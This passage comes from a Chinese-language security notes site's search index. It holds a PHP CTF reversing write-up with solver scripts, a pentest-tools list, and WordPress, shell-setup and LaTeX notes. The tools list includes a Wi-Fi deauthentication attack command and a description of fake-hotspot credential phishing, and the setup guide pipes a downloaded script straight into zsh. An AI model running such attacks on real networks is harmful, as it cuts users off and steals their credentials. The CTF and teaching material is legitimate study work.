(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;) Regex regex = new Regex(pattern); MatchCollection matches = regex.Matches(data); int found = 0; foreach (Match match in matches) { // Console.WriteLine(match); // Console.WriteLine(\u0026#34;----------------------------\u0026#34;); // Removing the first two characters (\u0026#39; string tmp = match.ToString().Remove(0, 1).Remove(0, 1); // Removing the last two characters \u0026#39;) tmp = tmp.Remove(tmp.Length - 2, 1).Remove(tmp.Length - 2, 1); tmp = tmp.Replace(\u0026#34;\u0026#39;^\u0026#39;\u0026#34;, \u0026#34;\\x01\u0026#34;); int val = 0; foreach (var x in tmp.Split(\u0026#39;\\x01\u0026#39;, StringSplitOptions.None)) { val ^= char.Parse(x); } data = data.Replace(match.ToString(), ((char)val).ToString()); found += 1; } Console.WriteLine($\u0026#34;RemoveParanthesisPattern: Total Matches Found: {found}\u0026#34;); return data; } // Fixes names of the form s.t.r.s.t.r --\u0026gt; strstr public static string FixDottedNames(string data, string pattern = \u0026#34;\u0026#34;) { // XXX: Use this pattern if something breaks // string pattern = @\u0026#34;\\((([a-z])\\.)+[a-z]\\)\u0026#34;; pattern = pattern == \u0026#34;\u0026#34; ? @\u0026#34;\\((([a-z0-9_])\\.)+[a-z]\\)\u0026#34; : pattern; Regex regex = new Regex(pattern); MatchCollection matches = regex.Matches(data); int found = 0; foreach (Match match in matches) { string tmp = match.ToString(); if (tmp.StartsWith(\u0026#34;(\u0026#34;)) { tmp = tmp.Remove(tmp.Length - 1, 1).Remove(0, 1); } tmp = tmp.Replace(\u0026#34;.\u0026#34;, \u0026#34;\u0026#34;); data = data.Replace(match.ToString(), tmp); found += 1; } Console.WriteLine($\u0026#34;FixDottedNames: Total Matches Found: {found}\u0026#34;); return data; } static void Main(string[] args) { string filename = \u0026#34;obfuscated.php\u0026#34;; string fileData = File.ReadAllText(filename); fileData = RemoveParanthesisPattern(fileData); fileData = FixDottedNames(fileData); // Step3 fileData = fileData.Replace(@\u0026#34;\u0026#39;\u0026#39;.abs(strstr(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))\u0026#34;, \u0026#34;\u0026#39;0\u0026#39;\u0026#34;); // Step4 fileData = RemoveParanthesisPattern(fileData); fileData = FixDottedNames(fileData); fileData = FixDottedNames(fileData, @\u0026#34;(([a-z0-9A-Z_])\\.)+[a-z0-9A-Z]\u0026#34;); fileData = fileData.Replace(\u0026#34;.\u0026#39;0\u0026#39;.\u0026#34;, \u0026#34;0\u0026#34;); File.WriteAllText(\u0026#34;deobfuscated.php\u0026#34;, \u0026#34;\u0026lt;?php\\n\u0026#34; + fileData); } } :::\n:::spoiler Result\n\u0026lt;?php (in_array(count(get_included_files()),[1])?(strcmp(php_sapi_name(),cli)?printf(Use. .php.-.cli. .to. .run. .the. .challenge.!. ):printf(gzinflate(base64_decode(1dTBDYAgDAXQe6fgaC8O4DDdfwyhVGmhbaKe./.BfQfF8gAQFKz8aRh0JEJY0qIIenINTBEY3qNNVUAfuXzIGitJVqpiBa4yp2U8ZKtKmANzewbaqG2lrAGbNWslOvgD52lULNLfgY9ZiZtdxCsLJ3.+.Q./.2RVuOxji0jyl9aJfrZLJzxhgtS65TWS66wdr7fYzRFtvc./.wU9Wpn6BQGc))).define(F,readline(Flag.\u0026#39;:\u0026#39;. )).(strcmp(strlen(constant(F)),41)?printf(Nope.!. ):(in_array(substr(constant(F),\u0026#39;0\u0026#39;,5),[crew.{])?(strstr(strrev((crc32)(substr(constant(F),5,4))),7607349263)?(strnatcmp(A.\u001b./.k,substr(constant(F),5,4)^substr(constant(F),9,4))?printf(Nope. .xor.!. ):srand(31337).define(D,openssl_decrypt(wCX3NcMho0BZO0SxG2kHxA.=.=,aes.-.128.-.cbc,substr(constant(F),\u0026#39;0\u0026#39;,16),2,pack(L.*,rand(),rand(),rand(),rand()))).(in_array(array_sum([ctype_print(constant(D)),strpos(substr(constant(F),15,17),constant(D))]),[2])?(strcmp(base64_encode(hash(sha256,substr(constant(F),\u0026#39;0\u0026#39;,32))^substr(constant(F),32)),BwdRVwUHBQVF)?printf(Nope.!. ):printf(Congratulations.\u0026#39;,\u0026#39;. .this. .is. .the. .right. .flag.!. )):printf(Nope.!. ))):printf(Nope.!. )):printf(Nope.!. )))):printf(Nope.!. )); ?\u0026gt; ::: 我另外把這坨東西弄的比較好讀一點 :::spoiler Beautiful Result\n\u0026lt;?php (in_array(count(get_included_files()),[1])? ( strcmp(php_sapi_name(),cli)? printf(Use php-cli to run the challenge!): printf(gzinflate(base64_decode(1dTBDYAgDAXQe6fgaC8O4DDdfwyhVGmhbaKe/BfQfF8gAQFKz8aRh0JEJY0qIIenINTBEY3qNNVUAfuXzIGitJVqpiBa4yp2U8ZKtKmANzewbaqG2lrAGbNWslOvgD52lULNLfgY9ZiZtdxCsLJ3+Q/2RVuOxji0jyl9aJfrZLJzxhgtS65TWS66wdr7fYzRFtvc/wU9Wpn6BQGc))) define(F,readline(Flag\u0026#39;:\u0026#39; )) ( strcmp(strlen(constant(F)),41)? printf(Nope!): ( in_array(substr(constant(F),\u0026#39;0\u0026#39;,5),[crew{])? ( strstr(strrev((crc32)(substr(constant(F),5,4))),7607349263)? ( strnatcmp(A\u001b/k,substr(constant(F),5,4)^substr(constant(F),9,4))? printf(Nope xor!): srand(31337) define(D,openssl_decrypt(wCX3NcMho0BZO0SxG2kHxA==,aes-128-cbc,substr(constant(F),\u0026#39;0\u0026#39;,16),2,pack(L*,rand(),rand(),rand(),rand()))) ( in_array(array_sum([ctype_print(constant(D)),strpos(substr(constant(F),15,17),constant(D))]),[2])? (strcmp(base64_encode(hash(sha256,substr(constant(F),\u0026#39;0\u0026#39;,32))^substr(constant(F),32)),BwdRVwUHBQVF)? printf(Nope!): printf(Congratulations\u0026#39;,\u0026#39; this is the right flag!)): printf(Nope!) ) ): printf(Nope!) ): printf(Nope!) ) ) ): printf(Nope!) ); ?\u0026gt; :::\n依照上面的background reference慢慢分析\n首先第五行的printf不是很重要，他只是印出題目logo :::spoiler :::\n第12行開始就是flag的驗證，前五個字元是==crew{==\n第14行就是把我們輸入的flag從第五個字元開始算四個字元，先進行crc32的運算，然後在反轉string，然後看是不是等於7607349263，所以先reverse回去成正常的字串，然後用github上人家寫的crc32 unhash腳本1轉換有可能的字串，可以看到結果有幾種，不過因為這邊只有取4 bytes代表答案是==php_==\n$ ./psysh \u0026gt; strrev(7607349263) = \u0026#34;3629437067\u0026#34; $ python crc32.py reverse 3629437067 4 bytes: php_ {0x70, 0x68, 0x70, 0x5f} verification checksum: 0xd854d08b (OK) 6 bytes: Jhj4VW (OK) 6 bytes: KtdYLZ (OK) 6 bytes: Lmcgfq (OK) 6 bytes: Nlw5W4 (OK) 6 bytes: OpyXM9 (OK) 6 bytes: PNLKv5 (OK) 6 bytes: TJQJwV (OK) 6 bytes: WjZ94F (OK) 6 bytes: ZENzKX (OK) 6 bytes: apUQJ2 (OK) 6 bytes: bmOnaz (OK) 6 bytes: etHPKQ (OK) 6 bytes: tEbsLS (OK) 6 bytes: v4JPxF (OK) 6 bytes: yjv03M (OK) 6 bytes: yv9l2Y (OK) 第17行他先把剛剛得到的php_和後面的四個字元做xor，並比對A\u001b/k，所以我們就把這幾個東西轉換成hex，再xor就好了\n\u0026gt;\u0026gt;\u0026gt; bytes.fromhex(\u0026#39;{:x}\u0026#39;.format(0x411b2F6B ^ 0x7068705F)).decode(\u0026#39;utf-8\u0026#39;) \u0026#39;1s_4\u0026#39; 第20行比較複雜，他先固定rand的seed，然後用openssl_decrypt解密一串密文，並和我們輸入的flag前16個字元做比較，但剛剛我們得到的flag只有到crew{php_1s_4共13個字元，代表我們要爆破剩下三個字元，所以我寫了一個php script和python script去擷取可能的結果 :::spoiler php script\n\u0026lt;?php $encryption = \u0026#34;wCX3NcMho0BZO0SxG2kHxA==\u0026#34;; $ciphering = \u0026#34;AES-128-CBC\u0026#34;; $decryption_key_ord = \u0026#34;crew{php_1s_4\u0026#34;; $options = 2; $str=array(\u0026#39;0\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;,\u0026#39;3\u0026#39;,\u0026#39;4\u0026#39;,\u0026#39;5\u0026#39;,\u0026#39;6\u0026#39;,\u0026#39;7\u0026#39;,\u0026#39;8\u0026#39;,\u0026#39;9\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;f\u0026#39;,\u0026#39;g\u0026#39;,\u0026#39;h\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;j\u0026#39;,\u0026#39;k\u0026#39;,\u0026#39;l\u0026#39;,\u0026#39;m\u0026#39;,\u0026#39;n\u0026#39;,\u0026#39;o\u0026#39;,\u0026#39;p\u0026#39;,\u0026#39;q\u0026#39;,\u0026#39;r\u0026#39;,\u0026#39;s\u0026#39;,\u0026#39;t\u0026#39;,\u0026#39;u\u0026#39;,\u0026#39;v\u0026#39;,\u0026#39;w\u0026#39;,\u0026#39;x\u0026#39;,\u0026#39;y\u0026#39;,\u0026#39;z\u0026#39;,\u0026#39;_\u0026#39;); for ($x = 0; $x \u0026lt;= 36; $x++) { for ($y = 0; $y \u0026lt;= 36; $y++) { for ($z = 0; $z \u0026lt;= 36; $z++) { srand(31337); $decryption_key = $decryption_key_ord.$str[$x].$str[$y].$str[$z]; // echo $decryption_key; $decryption_iv = pack(\u0026#34;L*\u0026#34;,rand(),rand(),rand(),rand()); $decryption=openssl_decrypt ($encryption, $ciphering, $decryption_key, $options, $decryption_iv); echo $str[$x].$str[$y].$str[$z]. \u0026#34; is \u0026#34; . $decryption. \u0026#34;\\n\u0026#34;; } } } ?\u0026gt; :::\n:::spoiler python script\nimport string candidate = string.ascii_lowercase + string.digits + \u0026#34;_ \u0026#34; def check_characters(string): for char in string: if char not in candidate: return False return True f = open(\u0026#34;./result.txt\u0026#34;, \u0026#34;rb\u0026#34;).read().splitlines()#D:/Download/Trash for i in range(len(f)): try: tmp = f[i].decode() if check_characters(tmp): print(f[i].decode()) except: pass :::\n$ php exp.php \u0026gt; result.txt $ python exp.py ... _l4 is ngu4ge_0f_m4g1c_ 在print出來的東西當中有一個特別長，那就是我們要找的三個字元和解密出來的東西，所以目前為止的flag是==crew{php_1s_4_l4ngu4ge_0f_m4g1c_==\n最後就是第22行的部分，他就是把crew{php_1s_4_l4ngu4ge_0f_m4g1c_進行SHA256和最後剩下的部分做XOR，再把結果進行base64，和BwdRVwUHBQVF比較(不知道為甚麼一樣的操作用python會失敗，我想應該是因為php有特別的操作?!)\n$ ./psysh \u0026gt; echo hash(\u0026#39;sha256\u0026#39;,\u0026#34;crew{php_1s_4_l4ngu4ge_0f_m4g1c_\u0026#34;) ^ base64_decode(\u0026#34;BwdRVwUHBQVF\u0026#34;) 5b0e7b6a} Flag: crew{php_1s_4_l4ngu4ge_0f_m4g1c_5b0e7b6a}\nReference # crc32 Tool\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":1,"href":"/tools/ctf/all-pentest-tools/","title":"All Pentest Tools","section":"Tools","content":" All Pentest Tools # 可以參考以下論文，裡面有詳細說明Vulnerability Assessment and Penetration Testing (VAPT)會使用到的工具有哪些 :::info Ravindran, U., \u0026amp; Potukuchi, R. V. (2022). A Review on Web Application Vulnerability Assessment and Penetration Testing. Review of Computer Engineering Studies, 9(1). :::\nWireless Related # 大部分都會用到Aircrack這個工具 Deauthentication - airodump-ng教學 / aireplay-ng教學 攻擊說明: [Day 05]資安百物語：第二談：現代飛頭蠻的反制法-反無人機技術(下) Scan 將掃描範圍縮小到一個目標，並取得連接到目標網路的裝置的MAC位址。 $ airodump-ng -bSSID \u0026lt;bssid\u0026gt; --ch \u0026lt;channels\u0026gt; WLAN0mon # 此命令用於通過識別 BSSID（基本服務集識別符）和所使用的通道來設置目標網路上的掃描 # -c: 指定只接收特定的 channels，如果有多個 channel，用 , 分隔，例如：-c 6,8,10,11 Attack $ aireplay-ng --deauth \u0026lt;count, e.g. 1000\u0026gt; -a \u0026lt;bssid, e.g. 6A:BF:C4:06:35:94\u0026gt; -c \u0026lt;AP MAC address, e.g 34:CF:F6:96:72:E2\u0026gt; wlan0mon # -c dmac : 指定 Client 的 MAC address # -a bssid : 指定 AP 的 MAC address # --deauth: count 是指執行阻斷的次數，如果設為 0 表循環攻擊，Client 將無法上網。 Fluxion 攻擊說明與工具教學: 實戰-Fluxion與wifi熱點偽造、釣魚、中間人攻擊、wifi破解，Fluxion 攻擊的主要目標是獲取目標 Wi-Fi 網路使用者使用的密碼或訪問憑據。此攻擊可使攻擊者未經授權訪問目標網路，而有關於Captive Portal(WEB Portal)的驗證流程可以參考這篇 Captive Portal Attack 根據前面的background可以知道web portal的驗證流程，那如果把原本的hotspot換成一個假的hotspot，讓使用者誤以為這是真的驗證頁面(需要帳號密碼之類的)，那我們就有機會拿到credentials session 直接取得SSID/BSSID/Channel Used/Password Used/Type of Security Applied MITM - Xerosploit教學 Sniff模組允許攻擊者監控通過目標Wi-Fi網路的數據流量，包括使用者發送的數據。通過監視此類流量，攻擊者可以竊取身份驗證憑據、個人資訊或其他敏感數據等資訊，sniff完了以後可以用wireshark打開看流量 WEP/WPA Attack WEP/WPA 注入攻擊是針對使用 WEP/WPA 安全協定的無線網路的針對性攻擊。此攻擊旨在滲透網路安全並獲得對透過網路傳輸的資料流量的未經授權的存取。一旦收集到加密的流量數據，攻擊者就可以分析該數據的模式和結構，以識別網路中使用的加密金鑰。透過取得加密金鑰，攻擊者可以破解透過網路發送的資料流量的加密。 Handshake on the target Wi-Fi network DoS - Aircrack的Wi-Fi DoS攻擊 Web Related # 以下分類是按照OWASP的Pentest框架順序分類\nRecon # NMAP教學 WpScan 專門檢測WordPress類型的網頁，有哪些漏洞，前期可以掃描出WP版本、安裝的theme或是插件有哪些、安全漏洞等等 Nessus教學 Nessus 作為修復網路、網站和軟體開發中的安全漏洞、作業系統漏洞、應用程式漏洞、配置漏洞等的工具 Attack # Metasploit教學 "},{"id":2,"href":"/problem-solutions/_wp-admin-vs-_wp-content-vs-_wp-include-vs-_wp-json/","title":"/wp-admin VS /wp-content VS /wp-include VS /wp-json","section":"Problem Solutions","content":" /wp-admin VS /wp-content VS /wp-include VS /wp-json # From Chat-GPT:\n1. wp-admin # 用途: WordPress 的後台管理系統。 位置: /wp-admin/ 內容: 包含所有與管理後台相關的 PHP 文件（如控制面板、用戶管理、文章管理等）。 提供網站管理者的操作界面。 訪問權限: 需要用戶登錄並具備管理員或其他授權身份才能訪問。 範例:\nhttp://example.com/wp-admin/：進入 WordPress 後台儀表板。 http://example.com/wp-admin/post-new.php：進入新增文章頁面。 2. wp-content # 用途: 儲存用戶生成的內容和可定制項目。 位置: /wp-content/ 內容: 主題 (themes)：網站外觀的所有文件。 外掛 (plugins)：網站功能擴展的所有文件。 上傳 (uploads)：用戶上傳的媒體文件（圖片、影片等）。 訪問權限: 通常開放訪問，因為靜態文件（如圖片或 CSS 文件）需要公開存取。 範例:\nhttp://example.com/wp-content/uploads/2025/01/image.jpg：上傳的圖片文件。 http://example.com/wp-content/themes/my-theme/style.css：主題樣式文件。 3. wp-includes # 用途: 儲存 WordPress 核心功能的代碼。 位置: /wp-includes/ 內容: 包含 WordPress 核心的 PHP 函數庫和類。 負責處理網站的內部邏輯，包括模板標籤、格式化工具和 API 的核心部分。 訪問權限: 通常禁止直接訪問這些文件，因為它們是內部功能實現的核心部分。 範例:\nhttp://example.com/wp-includes/js/jquery/jquery.min.js：加載 WordPress 內置的 jQuery 文件。 wp-includes/functions.php：包含核心函數。 4. wp-json # 用途: 提供 REST API 端點，用於數據交互。 位置: /wp-json/ 內容: WordPress REST API 的入口點。 用於開發者通過 API 操作網站數據（如獲取文章、創建用戶等）。 訪問權限: 根據 API 功能，部分公開（如獲取文章），部分需要授權（如創建、修改內容）。 範例:\nhttp://example.com/wp-json/wp/v2/posts：獲取網站的文章列表。 http://example.com/wp-json/wp/v2/users：獲取用戶數據（需授權）。 總結對比 # 名稱 功能 是否可公開訪問 主要存放內容 wp-admin 後台管理工具 需要授權 儀表板、管理頁面相關的 PHP 文件 wp-content 儲存用戶生成的內容和可定制項目 通常公開訪問 主題、外掛、上傳的媒體文件 wp-includes 核心功能的內部代碼 禁止直接訪問 核心函數、類、JavaScript 庫等 wp-json 提供 REST API 接口 根據 API 設定 互動 API 端點，用於訪問或操作網站數據 "},{"id":3,"href":"/problem-solutions/sudo-chmod-777--r-_usr-problem/","title":"`sudo chmod 777 -R /usr` Problem","section":"Problem Solutions","content":" sudo chmod 777 -R /usr Problem # tags: problem solution # 解决普通用户sudo时出现/usr/bin/sudo must be owned by uid 0 and have the setuid bit set\nIf you forget root password: su Authentication failure解决方法\nWSL2 的 /etc/sudoers 文件改错后：/etc/sudoers: syntax error near line 30 How to change default user in WSL Ubuntu bash on Windows 10 sudo: error in /etc/sudo.conf, line 0 while loading plugin \u0026lsquo;sudoers_policy\u0026rsquo;\nzsh compinit: insecure directories and files, run compaudit for list. zsh报错：_complete:96: bad math expression: operand expected at end of string\n"},{"id":4,"href":"/problem-solutions/~_.zshrc--initial-library/","title":"~/.zshrc \u0026 Initial Library","section":"Problem Solutions","content":" ~/.zshrc \u0026amp; Initial Library # Zsh # $ sudo apt install zsh gawk git -y $ sudo apt update; sudo apt upgrade -y; sudo apt install curl binutils vim npm -y $ chsh -s /bin/zsh $ curl -sL --proto-redir -all,https https://raw.githubusercontent.com/zplug/installer/master/installer.zsh | zsh $ vim ~/.zshrc # Add these lines in .zshrc # Lines configured by zsh-newuser-install HISTFILE=~/.histfile HISTSIZE=1000 SAVEHIST=1000 bindkey -e # End of lines configured by zsh-newuser-install # The following lines were added by compinstall zstyle :compinstall filename \u0026#39;/home/sbk6401/.zshrc\u0026#39; autoload -Uz compinit compinit # End of lines added by compinstall # Delete all temp download files alias ll=\u0026#34;ls -al\u0026#34; find . -name \u0026#34;*:Zone.Identifier\u0026#34; -type f -delete export ZSH=\u0026#34;$HOME/.zplug/repos/robbyrussell/oh-my-zsh\u0026#34; ZSH_THEME=\u0026#34;robbyrussell\u0026#34; ZSH_THEME=\u0026#34;powerlevel10k/powerlevel10k\u0026#34; source ~/.zplug/init.zsh npm install -g tldr # zplug plugins zplug \u0026#34;romkatv/powerlevel10k\u0026#34;, as:theme, depth:1 zplug \u0026#39;zplug/zplug\u0026#39;, hook-build:\u0026#39;zplug --self-manage\u0026#39; zplug \u0026#34;zsh-users/zsh-autosuggestions\u0026#34; if ! zplug check --verbose; then printf \u0026#34;Install? [y/N]: \u0026#34; if read -q; then echo; zplug install else echo fi fi zplug load # To customize prompt, run `p10k configure` or edit ~/.p10k.zsh. [[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh 客製化 zshrc source ~/anaconda3/bin/activate CTF cd /mnt/d/NTU/CTF/PicoCTF/ alias ll=\u0026#39;ls -al\u0026#39; alias gccc=\u0026#39;gcc -Wl,--dynamic-linker=/usr/src/glibc/glibc_dbg/elf/ld.so -g\u0026#39; gdb-gef # Touch 2 files\n$ wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py $ git clone https://github.com/longld/peda.git ~/peda $ git clone https://github.com/scwuaptx/Pwngdb.git ~/Pwngdb $ sudo apt install gdb -y $ vim ~/.gdbinit # Add these lines in ~/.gdbinit set disassembly-flavor intel define gef source ~/.gdbinit-gef.py #### gef # gef setting gef config dereference.max_recursion 2 gef config context.layout \u0026#34;regs code args source memory stack trace\u0026#34; gef config context.nb_lines_backtrace 3 gef config context.redirect /dev/pts/2 end define peda source ~/peda/peda.py source ~/Pwngdb/pwngdb.py source ~/Pwngdb/angelheap/gdbinit.py define hook-run python import angelheap angelheap.init_angelheap() end end end Reference # zsh + zplug快速部屬你的Shell工作環境\n"},{"id":5,"href":"/tools/others/_latex-%E8%AA%9E%E6%B3%95%E7%AD%86%E8%A8%98/","title":"$\\LaTeX$ 語法筆記","section":"Tools","content":" HackMD 是透過 MathJax 支援 $\\LaTeX$ ，雖未支援所有語法，對多數人應已足夠，一起把 Web 上醜死的公式換成美美的吧～\n$\\LaTeX$ 語法筆記 # $$ \\LaTeX % 大小寫須正確 $$\n\\LaTeX % 大小寫須正確 $\\textstyle$ $$\\displaystyle$$ %comment $$ \\grave apple % 標重音 $$\n\\grave apple % 標重音 $$ {\\bf AB} % 粗體 boldface $$\n{\\bf AB} % 粗體 boldface $$ \\bar{A} $$\n\\bar{A} $$ { a+b \\brace c+d } $$\n{ a+b \\brace c+d } $$ \\overline{AB} $$\n\\overline{AB} $$ \\vec{v} $$\n\\vec{v} $$ \\frac{b}{a} $$\n\\frac{b}{a} % 或 {b \\over a} $$ \\dfrac{b}{a} $$\n\\dfrac{b}{a} % d for \\displaystyle \\tfrac{b}{a} % t for \\textstyle $$ 90^\\circ $$\n90^\\circ $$ e^{\\theta i} $$\ne^{\\theta i} $$ S_{n} $$\nS_{n} $$ \\lim\\limits_{n\\to \\infty} $$\n\\lim\\limits_{n\\to \\infty} $$ \\sum\\limits_{x = 0}^k{x^2} $$\n\\sum\\limits_{x = 0}^k{x^2} $$ \\bigcup\\limits_{i = 1}^{\\infty}{U_i} $$\n\\bigcup\\limits_{i = 1}^{\\infty}{U_i} $$ \\bigcap\\limits_{i = 1}^{\\infty}{U_i} $$\n\\bigcap\\limits_{i = 1}^{\\infty}{U_i} $$ \\mathop{\\vcenter{\\huge\\times}}_\\limits{i=1}^n{U_i} $$\n\\mathop{\\vcenter{\\huge\\times}}_\\limits{i=1}^n{U_i} $$ \\int_a^b x^2 \\mathrm{d} x $$\n\\int_a^b x^2 \\mathrm{d} x $$ \\sqrt[n]{1+x+x^2+x^3+\\dots+x^n} $$\n\\sqrt[n]{1+x+x^2+x^3+\\dots+x^n} % 或 \\root n \\of {1+x+x^2+x^3+\\dots+x^n} $$ A \\implies B $$\nA \\implies B $$ A \\impliedby B $$\nA \\impliedby B $$ A \\iff B $$\nA \\iff B $$ f: A \\to B $$\nf: A \\to B $$ A \\leftarrow B $$\nA \\leftarrow B $$ \\xrightarrow{中文亦可}\\ \\xleftarrow{中文亦可} $$\n\\xrightarrow{中文亦可}\\ \\xleftarrow{中文亦可} $$ a,\\overset{?}{=},b $$\na\\,\\overset{?}{=}\\,b $$ \\forall x \\in X, \\exists x \\in b $$\n\\forall x \\in X, \\exists x \\in b $$ \\not\\in, \\not\\gt, \\not\\lt, \\not= $$\n\\not\\in, \\not\\gt, \\not\\lt, \\not= % 利用 \\not 組合表示否定 $$ a_{1}, a_{2}, \\ldots, a_{n} $$\na_{1}, a_{2}, \\ldots, a_{n} $$ a_{1} + a_{2} + \\cdots + a_{n} $$\na_{1} + a_{2} + \\cdots + a_{n} $$ \\begin{pmatrix} a_{11} \u0026amp; a_{12} \u0026amp; \\cdots \u0026amp; a_{1n}? a_{21} \u0026amp; a_{22} \u0026amp; \\cdots \u0026amp; a_{2n}\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots\\ a_{m1} \u0026amp; \\cdots \u0026amp; \\cdots \u0026amp; a_{mn} \\end{pmatrix} $$\n\\begin{pmatrix} a_{11} \u0026amp; a_{12} \u0026amp; \\cdots \u0026amp; a_{1n}\\\\ a_{21} \u0026amp; a_{22} \u0026amp; \\cdots \u0026amp; a_{2n}\\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots\\\\ a_{m1} \u0026amp; \\cdots \u0026amp; \\cdots \u0026amp; a_{mn} \\end{pmatrix} % ldots: low dots % cdots: center dots % ddots: diagonal dots % vdots: vertical dots $$ \\left{ \\begin{array}{c} a_1x+b_1y+c_1z=d_1 \\ a_2x+b_2y+c_2z=d_2 \\ a_3x+b_3y+c_3z=d_3 \\end{array} \\right. $$\n\\left\\{ \\begin{array}{c} a_1x+b_1y+c_1z=d_1 \\\\ a_2x+b_2y+c_2z=d_2 \\\\ a_3x+b_3y+c_3z=d_3 \\end{array} \\right. Operator/Relation # $A\\times B$ = A\\times B $a\\cdot b$ = a\\cdot b $\\div$ = \\div $\\pmod n$ = \\pmod n $\\pm$ = \\pm (plus and minus) $\\partial$ = \\partial $\\oplus$ = \\oplus $\u0026amp;$= \\\u0026amp; $\\gt$ = \\gt (greater than) $\\lt$ = \\lt (less than) $\\ge$ = \\ge (greater or equal) $\\le$ = \\le (less or equal) $\\lhd$ = \\lhd (normal subgroup) $\\unlhd$ = \\unlhd $\\ne$ = \\ne (not equal) $\\approx$ = \\approx (approximate to) $\\sim$ = \\sim (similar) $\\cong$ = \\cong (congruent) $\\equiv$ = \\equiv (equivalent) $\\ll$ = \\ll, much less than $\\gg$ = \\gg, much greater than $\\nless$ = \\nless, not less than $\\ngtr$ = \\ngtr, not greater than $\\cap$ = \\cap, 像帽子, intersection $\\cup$ = \\cup, 像杯子, union $\\subset$ = \\subset, or implied $\\supset$ = \\superset, or implies $\\subseteq$ = \\subseteq $\\supseteq$ = \\supseteq $\\land$ = \\land (logical and); \\wedge (wedge product) $\\lor$ = \\lor (logical or)\nList of Logic Symbols\nFunction # $\\binom{a}{b}$ = \\binom{a}{b}\nBinomial : $\\frac{C!}{n!(n-k)!}, where\\ (n+k) = constant$ 或 \\binom a b 或 { a \\choose b } \\tbinom a b (t for \\textstyle) \\dbinom a b (d for \\displaystyle)\n$\\cos{\\theta}$ = \\cos{\\theta} $\\sin{\\theta}$ = \\sin{\\theta} $\\log_{b}{x}$ = \\log_{b}{x} $\\ln{x}$ = \\ln{x} $\\lceil x \\rceil$ = \\lceil x \\rceil $\\lfloor x \\rfloor$ = \\lfloor x \\rfloor\nMatrix # $$ \\begin{pmatrix}A\\B\\end{pmatrix} $$\n\\begin{pmatrix} A\\\\B % \\\\ 為 newline(換行) \\end{pmatrix} % 或 \\pmatrix{A\\\\B} $$ \\begin{bmatrix}A\\B\\end{bmatrix} $$\n\\begin{bmatrix} A\\\\B \\end{bmatrix} $$ \\begin{vmatrix}A\\B\\end{vmatrix} $$\n\\begin{vmatrix} A\\\\B \\end{vmatrix} $$ \\begin{Vmatrix}A\\B\\end{Vmatrix} $$\n\\begin{Vmatrix} A\\\\B \\end{Vmatrix} $$ \\begin{bmatrix} a \u0026amp; b \\ c \u0026amp; d \\end{bmatrix} $$\n\\begin{bmatrix} a \u0026amp; b \\\\ c \u0026amp; d \\end{bmatrix} Greek # $\\alpha$ = \\alpha $\\beta$ = \\beta $\\Delta$ = \\Delta, $\\delta$ = \\delta $\\epsilon$ = \\epsilon, $\\varepsilon$ = \\varepsilon $\\gamma$ = \\gamma $\\theta$ = \\theta $\\sigma$ = \\sigma $\\pi$ = \\pi $\\mu$ = \\mu $\\lambda$ = \\lambda $\\omega$ = \\omega $\\phi$ = \\phi $\\varphi$ = \\varphi $\\rho$ = \\rho\nMisc # $\\angle$ = \\angle $\\triangle$ = \\triangle $\\square$ = \\square $\\quad (space)$ = \\quad (space) $\\propto$ = \\propto (propotional to)\n$\\because$ = \\because $\\therefore$ = \\therefore $\\mathbb{Z}$ = \\mathbb{Z} $\\mathbb{P}$ = \\mathbb{P} $\\mathbb{R}$ = \\mathbb{R} $\\mathbb{C}$ = \\mathbb{C} $\\Im$ = \\Im (Imaginary Space) $\\Re$ = \\Re (Real Space)\n$\\emptyset$ = \\emptyset $\\varnothing$ = \\varnothing (以此表示空集合較好看) $\\in$ = \\in $\\not\\in$ = \\not\\in $\\langle S\\rangle$ = \\langel S\\rangle (generator) $\\chi$ = \\chi $\\circlearrowleft$ = \\circlearrowleft $\\circlearrowright$ = \\circlearrowright $\\curvearrowleft$ = \\curvearrowleft $\\curvearrowright$ = \\curvearrowright $\\hbar$ = \\hbar (Planck\u0026rsquo;s Constant)\nhttps://oeis.org/wiki/List_of_LaTeX_mathematical_symbols#Set_and.2For_logic_notation\nFormat # Style # $$ \\style{background-color:#eeeeee}{\\frac{x+1}{y+2}} $$\n\\style{background-color:#eeeeee}{\\frac{x+1}{y+2}} % 直接以 CSS 改變 style $$ f(x) = a{\\color{red}{x}} + b $$\nf(x) = a{\\color{red}{x}} + b % 或 f(x) = a{\\color{#ff0000}{x}} + b $$ \\require{color} \\colorbox{#eeeeee}{Color Box} $$\n\\require{color} \\colorbox{#eeeeee}{Color Box} $$ {\\cal ABCDE12345abcde} $$\n{\\cal ABCDE12345abced} % callgraphic mode $$ \\fbox{boxed text} $$\n\\fbox{boxed text} % in textstyle $$ \\boxed{boxed\\ text} $$\n\\boxed{boxed\\ text} % in displaystyle $$ \\text{text $E=mc^2$} $$\n\\text{text $E=mc^2$} $$ {\\frak ABCDE12345abcde} $$\n{\\frak ABCDE12345abcde} $$ {\\it abefg12345}\\ abcdefg12345 $$\n{\\it abefg12345}\\ abcdefg12345 % italic $$ \\min\\limits_{n} $$\n\\min\\limits_{n} Automatic Sizing # $$ {x \\mid x\\gt 1}\\text{ 與 }{x | x\\gt 1} $$\n\\{x \\mid x\\gt 1\\} % 請用 \\mid 寫 Set 才好看 $$ \\left( \\dfrac{x^2}{y^3} \\right) $$\n\\left(\\dfrac{x^2}{y^3}\\right) $$ \\left{ \\dfrac{1}{2} \\right} $$\n\\left\\{ \\dfrac{1}{2} \\right\\} $$ f(x) = \\left{ \\begin{array}{r} x + by = c \\ dx + ey = f \\end{array} \\right. $$\nf(x) = \\left\\{ \\begin{array}{r} x + by = c \\\\ dx + ey = f \\end{array} \\right. % {r} for right alignment within array % {l} for left alignment within array % 或 \\array{ x + by = c \\\\ dx + ey = f } $$ z = \\overbrace{ \\underbrace{x}\\text{real} + i \\underbrace{y}\\text{imaginary} }^\\text{complex number} $$\nz = \\overbrace{ \\underbrace{x}_\\text{real} + i 